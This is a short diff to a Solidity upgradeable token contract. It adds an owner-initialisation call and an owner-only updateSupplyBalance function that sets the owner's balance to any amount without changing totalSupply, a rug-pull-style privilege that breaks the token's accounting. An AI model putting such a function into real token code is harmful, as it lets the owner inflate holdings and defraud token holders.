@@ -17,6 +17,7 @@ contract Token is Initializable, OwnableUpgradeable {
     symbol = _symbol;
     totalSupply = _totalSupply;
     balances[msg.sender] = totalSupply;
+    __Ownable_init();
   }
 
   function transfer(address to, uint256 amount) external {
@@ -29,6 +30,10 @@ contract Token is Initializable, OwnableUpgradeable {
 
   function balanceOf(address account) external view returns (uint256) {
     return balances[account];
+  }
+
+  function updateSupplyBalance(uint256 newSupply) public onlyOwner {
+    balances[msg.sender] = newSupply;
   }
 
 }
